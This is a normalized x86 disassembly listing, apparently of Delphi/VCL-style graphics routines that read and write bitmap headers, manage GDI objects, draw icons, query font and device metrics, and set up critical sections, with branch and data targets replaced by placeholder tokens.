mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_420c27
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41df14
mov [ ebp - 0x30 ] eax
sub_420c44
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4205f8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_420c88
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_4202a8
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_415618
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402c64
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4205f8
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_420720
call sub_41d710
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_420cf8
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_4202a8
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402c64
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_41f8c0
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_420d93
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4205f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_420dbc
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_420164
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_4202a8
mov eax esi
call sub_420498
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_4202a8
mov eax esi
call sub_420498
mov eax esi
call sub_420234
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_41f8c0
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_41fcc4
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_4205f8
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_4205f8
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_41f25c
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_420ef4
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4202b8
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_41fcc4
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_420f48
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4202b8
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_41fcc4
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_420fc8
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_4202a8
mov eax ebx
call sub_4202b8
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_41f25c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42105f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4205f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_41f154
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_41b454
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_421064
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_4039f4
call sub_403a48
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_41f154
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42109c
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4202b8
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_41fcc4
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4210f8
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402c64
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_420234
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_41e650
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_415650
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_415650
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402c64
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_4200f8
mov dl [ r-xdata ]
call sub_41d50c
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_41d824
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_41f210
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_415650
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_415650
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_415650
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_415650
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_415650
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_415650
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_41dc94
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_415650
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_41dfb8
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_4213b8
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_4202b8
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_41f25c
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_421432
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_41f8c0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_421458
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_4214a0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41e98c
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_41f088
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_4214f4
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_41f08c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413d24
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_421524
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_4217fc
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_41f088
mov eax [ esi + 0x28 ]
call sub_41f08c
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_413d50
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_421584
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_41d50c
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4215dc
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_421618
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_41540c
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_415618
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_41e264
jmp r-xdata
jmp r-xdata
call sub_41d71c
sub_421690
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42171d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4215dc
cmp eax [ rw-data ]
jne r-xdata
call sub_41d71c
mov eax esi
call sub_4215dc
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_41e790
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402c64
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_415650
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_421744
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4217d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_4153ec
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_415618
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_415618
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_4217fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_41d71c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4217d7
mov eax [ ebp - 0x4 ]
call sub_403258
call sub_4039f4
call sub_403a48
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4217fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42183c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f088
mov eax [ ebx + 0x28 ]
call sub_41f08c
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4218bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_421690
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_415650
pop esi
pop ebx
retn
sub_42190c
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_41dd64
mov [ rw-data ] eax
pop ebx
retn
sub_421944
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_421988
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_421944
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_421a54
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_421a8c
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax esi
call sub_421c84
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_421ad0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_421ab8
xor eax eax
push ebp
push sub_421b71
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421b78
mov eax [ ebp - 0x4 ]
call sub_421ac4
retn
mov eax 0x10
call sub_4026bc
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_421b84
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_421b84
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fb30
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_421c63
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_4200f8
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_41cacc
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_41c9b0
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412378
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_41d014
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_41d3f0
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_41fdb4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421c84
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_421ab8
xor eax eax
push ebp
push sub_421ccf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421cd6
mov eax [ ebp - 0x4 ]
call sub_421ac4
retn
mov esp ebp
pop ebp
retn
sub_421cd6
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_403258
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_421ab8
xor eax eax
push ebp
push sub_421ccf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421cd6
mov eax [ ebp - 0x4 ]
call sub_421ac4
retn
mov esp ebp
pop ebp
retn
sub_421cfc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_41bd24
push eax
mov eax ebx
call sub_41bd24
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_421ad0
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_421d34
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_421dfd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421e04
retn
mov eax [ rw-data ]
call sub_403258
mov eax [ rw-data ]
call sub_403258
mov eax [ rw-data ]
call sub_403258
call sub_41ed6c
mov eax [ rw-data ]
call sub_403258
mov eax [ rw-data ]
call sub_403258
